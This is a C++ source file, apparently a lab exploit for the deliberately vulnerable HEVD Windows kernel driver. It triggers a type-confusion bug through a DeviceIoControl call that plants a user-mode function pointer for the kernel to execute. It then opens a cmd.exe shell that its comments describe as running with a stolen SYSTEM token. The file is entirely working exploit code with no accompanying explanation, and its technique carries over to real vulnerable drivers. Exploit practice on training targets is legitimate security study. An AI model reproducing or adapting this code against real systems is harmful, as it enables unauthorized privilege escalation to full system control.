#include <stdio.h>
#include <Windows.h>

extern "C" void __stdcall payload(void);

int main()
{
	// Variables for the exploit
	HANDLE driver;
	DWORD bytes_returned;
	uintptr_t payloadAddy = (uintptr_t)payload;
	int IOCTL_opcode = 0x222023;
	int pointer_offset = 8;
	const char* driverPath = "\\\\.\\HackSysExtremeVulnerableDriver";
	char out[64];
	char* data;

	printf("HEVD Type Confusion x64 exploit\n");
	
	printf("[*] Payload function at %p\n", payload);

	printf("Press enter to execute payload\n");
	getchar();

	// Open a handle to the driver
	driver = CreateFileA(driverPath, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	if (driver == INVALID_HANDLE_VALUE)
	{
		printf("[-] Error %d opening handle to driver\n", GetLastError());
		return 0;
	}

	printf("[+] Opened handle to driver %p\n", driver);

	// Allocate some memory for our payload
	data = (char*)malloc(64);
	if (data == 0)
	{
		printf("[-] Error %d allocating memory for payload\n", GetLastError());
		CloseHandle(driver);
		return 0;
	}
	// Setup our payload, the structure is unknown in this case but
	// since all a structure is just a template for interpreting data
	// We can just send data, find whats relavant (in this case the function pointer)
	// And send arbitrary data but make that member equal to what we need
	// (in this case the user mode address of our payload function)
	memset(data, '\x41', pointer_offset);
	memcpy(data + pointer_offset, &payloadAddy, sizeof(uintptr_t));

	// Send the IOCTL opcode to the driver with our payload
	if (!DeviceIoControl(driver, IOCTL_opcode, data, pointer_offset + sizeof(uintptr_t), out, 16, &bytes_returned, 0))
	{
		printf("[-] Error %d sending IOCTL code to driver\n", GetLastError());
		free(data);
		CloseHandle(driver);
		return 0;
	}

	// Free up our data memory and driver handle since we don't need them now
	free(data);
	CloseHandle(driver);

	printf("[+] Payload sent!\nOpening shell as system");

	// Launch cmd.exe with CreateProcess using our new system security token!
	STARTUPINFOA startInfo;
	PROCESS_INFORMATION procInfo;
	memset(&startInfo, 0, sizeof(STARTUPINFOA));
	startInfo.cb = sizeof(STARTUPINFOA);

	if (!CreateProcessA(0, (LPSTR)"cmd.exe", 0, 0, 0, 0, 0, 0, &startInfo, &procInfo))
	{
		printf("[-] Error %d starting shell\n", GetLastError());
		return 0;
	}
	else
	{
		WaitForSingleObject(procInfo.hProcess, INFINITE);
		CloseHandle(procInfo.hThread);
		CloseHandle(procInfo.hProcess);
	}

	return 0;
}